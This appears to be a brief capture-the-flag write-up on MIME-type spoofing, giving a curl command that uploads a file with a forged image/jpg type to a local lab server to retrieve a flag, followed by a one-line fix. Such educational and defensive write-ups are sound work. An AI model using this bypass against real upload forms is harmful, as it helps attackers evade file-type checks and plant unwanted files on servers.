# MIME-type spoofing
The server can't rely on the (client-supplied) MIME-type to be correct. This flag can be triggered by uploading a file with the MIME-type `image/jpg` but a conflicting file extension. The flag is returned where the `<file> successfully uploaded` response is.

The response can be triggered with `curl`, e.g.:
```shell
curl \
-F "uploaded=@text.png; type=image/jpg" \
-F "Upload=Upload" \
-X POST "http://192.168.99.100/?page=upload#" \
| grep flag
```

# How to fix
Check that the file actually is what the user claims it to be.
